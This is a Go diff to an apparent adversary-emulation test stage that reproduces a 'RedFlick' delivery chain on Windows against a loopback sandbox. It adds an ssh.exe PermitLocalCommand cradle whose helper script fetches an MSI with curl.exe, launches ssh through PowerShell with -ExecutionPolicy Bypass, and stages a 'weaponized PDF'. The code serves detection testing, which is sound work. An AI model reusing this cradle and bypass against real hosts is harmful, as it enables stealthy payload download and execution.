@@ -37,6 +37,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -88,65 +89,99 @@ func performTechnique() error {
 	// ---------------------------------------------------------------
 	// Primitive 1 — ssh.exe PermitLocalCommand cradle (January chain)
 	// ---------------------------------------------------------------
-	// Exact flag surface from the disclosure. In the real attack the
-	// LocalCommand downloads/executes the remotely hosted MSI. Here the
-	// cradle points at the loopback listener; a credential refusal is the
-	// expected sandbox outcome and the command-line telemetry is the
-	// observable under test.
-	sshAvailable := false
-	conn, err := net.DialTimeout("tcp", "127.0.0.1:22", 3*time.Second)
-	if err == nil {
-		sshAvailable = true
-		_ = conn.Close()
+	// Preferred path (realism lift 2): the orchestrator runs an in-process
+	// loopback SSH sandbox whose per-run client key is passed via env — the
+	// cradle AUTHENTICATES SUCCESSFULLY and PermitLocalCommand actually
+	// EXECUTES its local fetch, exactly the documented RedFlick mechanism.
+	// Fallback (standalone stage runs): the same flag surface against
+	// 127.0.0.1:22, where a credential refusal is the expected outcome and
+	// the command-line telemetry is the observable.
+	sshPort := os.Getenv("F0_SSH_PORT")
+	sshKey := os.Getenv("F0_SSH_KEY")
+	cradleTarget := ""
+	sshArgs := []string(nil)
+
+	if sshPort != "" && sshKey != "" {
+		cradleTarget = fmt.Sprintf("loopback SSH sandbox on 127.0.0.1:%s", sshPort)
+	} else {
+		conn, dialErr := net.DialTimeout("tcp", "127.0.0.1:22", 3*time.Second)
+		if dialErr == nil {
+			_ = conn.Close()
+			cradleTarget = "127.0.0.1:22 (standalone fallback — auth refusal expected)"
+		}
 	}
 
-	if sshAvailable {
+	if cradleTarget == "" {
+		LogMessage("INFO", TECHNIQUE_ID, "no loopback SSH endpoint available — ssh.exe cradle primitive skipped with note")
+	} else {
 		// The LocalCommand value must be a SINGLE TOKEN (no spaces, no quotes):
 		// Go's argv quoting emits embedded \" escapes that hang the Windows
 		// OpenSSH client (reproduced on Win11 26200 — lab finding 2026-09-30).
 		// The cradle's intent (LocalCommand fetches the MSI) is preserved by
-		// pointing at a helper script the stage writes first.
+		// pointing at a helper script the stage writes first; the helper also
+		// drops a marker proving PermitLocalCommand executed client-side.
 		msiDest := filepath.Join(LOG_DIR, "setup.msi")
 		helperPath := filepath.Join(LOG_DIR, "f0ldcmd.cmd")
-		helper := fmt.Sprintf("@echo off\r\ncurl.exe -s -S --max-time 30 -o \"%s\" %s/assets/setup.msi\r\n", msiDest, baseURL)
+		cradleMarker := filepath.Join(LOG_DIR, "cradle_ran.log")
+		os.Remove(cradleMarker)
+		helper := fmt.Sprintf("@echo off\r\necho %%date%% %%time%% cradle-ran >> \"%s\"\r\ncurl.exe -s -S --max-time 30 -o \"%s\" %s/assets/setup.msi\r\n", cradleMarker, msiDest, baseURL)
 		if err := os.WriteFile(helperPath, []byte(helper), 0755); err != nil {
 			return fmt.Errorf("LocalCommand helper write failed: %v", err)
 		}
 		LogFileDropped("f0ldcmd.cmd", helperPath, int64(len(helper)), false)
 
-		sshArgs := []string{
+		sshArgs = []string{
 			"-o", "PermitLocalCommand=yes",
 			"-o", "LocalCommand=" + helperPath,
 			"-o", "StrictHostKeyChecking=no",
 			"-o", "BatchMode=yes",
 			"-o", "ConnectTimeout=5",
-			"redflick-sandbox@127.0.0.1",
-			"exit",
+		}
+		if sshPort != "" && sshKey != "" {
+			// Loopback sandbox path: pin identity and known-hosts to LOG_DIR so
+			// the user's real ~/.ssh state is never touched
+			sshArgs = append(sshArgs,
+				"-o", "IdentitiesOnly=yes",
+				"-o", "UserKnownHostsFile="+filepath.Join(LOG_DIR, "f0_known_hosts"),
+				"-i", sshKey,
+				"-p", sshPort,
+			)
+		}
+		sshArgs = append(sshArgs, "redflick-sandbox@127.0.0.1", "exit")
+
+		// ssh.exe is launched via PowerShell Start-Process with file-redirected
+		// output: as a direct Go child with piped stdio the Windows OpenSSH
+		// client misbehaves (never attempts auth, then never exits — lab
+		// finding 2026-10-01, isolated across three invocation variants).
+		// The ssh.exe command line — the process-creation telemetry under
+		// test — is identical either way.
+		exit, output, sshErr := runSSHViaStartProcess(sshArgs, cradleTarget)
+		LogProcessExecution("ssh.exe", fmt.Sprintf("ssh.exe %s", strings.Join(maskArg(sshArgs, "LocalCommand="), " ")), 0, sshErr == nil, exit, output)
+
+		markerRan := false
+		if _, statErr := os.Stat(cradleMarker); statErr == nil {
+			markerRan = true
 		}
 
-		// Hard bound on the whole ssh call — ConnectTimeout only bounds TCP,
-		// and a pathological client state must never hang the stage (the
-		// orchestrator watchdog would otherwise burn 180s here).
-		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-		defer cancel()
-		cmd := exec.CommandContext(ctx, filepath.Join(os.Getenv("SystemRoot"), "System32", "OpenSSH", "ssh.exe"), sshArgs...)
-		out, sshErr := cmd.CombinedOutput()
-		exit := exitCodeOf(sshErr)
-		if ctx.Err() == context.DeadlineExceeded {
-			exit = 102
-		}
-		LogProcessExecution("ssh.exe", fmt.Sprintf("ssh.exe %s", strings.Join(maskArg(sshArgs, "LocalCommand="), " ")), pidOf(cmd), sshErr == nil, exit, strings.TrimSpace(string(out)))
-		// Credential refusal is the expected sandbox outcome — NOT a protection
-		// event (Rule 8). The cradle primitive counts as exercised either way:
-		// the exact flag surface generated its process-creation telemetry.
-		if exit == 102 {
-			LogMessage("WARN", TECHNIQUE_ID, "ssh.exe did not return within 30s and was terminated — cradle telemetry already generated; continuing")
+		if sshPort != "" {
+			// Verdict file survives cleanup (the utility removes only named
+			// artifacts) so the run evidence outlives the stage's in-memory log
+			verdict := fmt.Sprintf(`{"stage":2,"ssh_exit":%d,"permit_local_command_ran":%v,"target":%q}`+"\n", exit, markerRan, cradleTarget)
+			_ = os.WriteFile(filepath.Join(LOG_DIR, "stage2_verdict.json"), []byte(verdict), 0644)
+			if exit == 0 && markerRan {
+				LogMessage("SUCCESS", TECHNIQUE_ID,
+					"ssh.exe authenticated against the loopback SSH sandbox and PermitLocalCommand executed client-side (marker present) — the documented RedFlick delivery mechanism")
+			} else if exit == 0 {
+				LogMessage("WARN", TECHNIQUE_ID, "ssh.exe exited 0 but the PermitLocalCommand marker is absent — continuing to explicit fetch")
+			} else {
+				LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("ssh.exe cradle exited %d against loopback sandbox — continuing to explicit fetch", exit))
+			}
+		} else if markerRan {
+			LogMessage("SUCCESS", TECHNIQUE_ID, "ssh.exe PermitLocalCommand executed client-side against 127.0.0.1:22 (marker present)")
 		} else {
 			LogMessage("INFO", TECHNIQUE_ID,
-				fmt.Sprintf("ssh.exe cradle exercised (exit %d) — credential refusal expected in sandbox; flag surface generated", exit))
+				fmt.Sprintf("ssh.exe cradle exercised (exit %d) — credential refusal expected in standalone mode; flag surface generated", exit))
 		}
-	} else {
-		LogMessage("INFO", TECHNIQUE_ID, "no listener on 127.0.0.1:22 — ssh.exe cradle primitive skipped with note (loopback SSH absent)")
 	}
 
 	// ---------------------------------------------------------------
@@ -167,8 +202,10 @@ func performTechnique() error {
 	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("weaponized PDF staged (%d bytes, cAB marker verified)", len(pdfData)))
 
 	msiDest := filepath.Join(LOG_DIR, "setup.msi")
-	if err := curlFetch(baseURL+"/assets/setup.msi", msiDest); err != nil {
-		return fmt.Errorf("curl fetch of setup.msi failed: %v", err)
+	if _, statErr := os.Stat(msiDest); statErr == nil {
+		LogMessage("INFO", TECHNIQUE_ID, "MSI package already staged by the ssh.exe cradle's LocalCommand fetch")
+	} else if err := curlFetch(baseURL+"/assets/setup.msi", msiDest); err != nil {
+		return fmt.Errorf("curl fetch of setup.msi ended: %v", err)
 	}
 	msiData, err := os.ReadFile(msiDest)
 	if err != nil {
@@ -181,6 +218,57 @@ func performTechnique() error {
 	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("MSI package staged (%d bytes) for Stage 4", len(msiData)))
 
 	return nil
+}
+
+// runSSHViaStartProcess launches ssh.exe through powershell.exe
+// Start-Process with file-redirected output and waits for it, bounded by a
+// hard context timeout. Rationale (lab finding 2026-10-01): as a direct Go
+// child with piped stdio, the Windows OpenSSH client never attempts auth and
+// never exits; launched with file redirects it authenticates, executes
+// PermitLocalCommand, and exits cleanly (~2s). All ssh args are single
+// space-free tokens, so the space-joined ArgumentList string is exact.
+func runSSHViaStartProcess(sshArgs []string, target string) (int, string, error) {
+	sshExe := filepath.Join(os.Getenv("SystemRoot"), "System32", "OpenSSH", "ssh.exe")
+	outFile := filepath.Join(LOG_DIR, "ssh_cradle.out")
+	errFile := filepath.Join(LOG_DIR, "ssh_cradle.err")
+	for _, f := range []string{outFile, errFile} {
+		os.Remove(f)
+	}
+
+	ps := fmt.Sprintf(
+		`$p = Start-Process -FilePath '%s' -ArgumentList '%s' -PassThru -NoNewWindow -RedirectStandardOutput '%s' -RedirectStandardError '%s' -Wait; Write-Output ('exit=' + $p.ExitCode)`,
+		sshExe, strings.Join(sshArgs, " "), outFile, errFile)
+
+	ctx, cancel := context.WithTimeout(context.Background(), 40*time.Second)
+	defer cancel()
+	start := time.Now()
+	psOut, psErr := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
+	elapsed := time.Since(start)
+
+	output := strings.TrimSpace(string(psOut))
+	for _, f := range []string{errFile, outFile} {
+		if data, err := os.ReadFile(f); err == nil && len(strings.TrimSpace(string(data))) > 0 {
+			output += " | " + strings.Join(strings.Fields(string(data)), " ")
+		}
+	}
+	output = strings.TrimSpace(output)
+
+	exit := 999
+	if i := strings.Index(output, "exit="); i >= 0 {
+		fields := strings.Fields(output[i+5:])
+		if len(fields) > 0 {
+			if code, err := strconv.Atoi(strings.TrimSpace(fields[0])); err == nil {
+				exit = code
+			}
+		}
+	}
+	if ctx.Err() == context.DeadlineExceeded {
+		return 102, output + fmt.Sprintf(" (terminated after %s bound)", elapsed), fmt.Errorf("timeout")
+	}
+	if psErr != nil && exit == 999 {
+		return 999, output, psErr
+	}
+	return exit, output, nil
 }
 
 // curlFetch runs the system curl.exe against the loopback server —
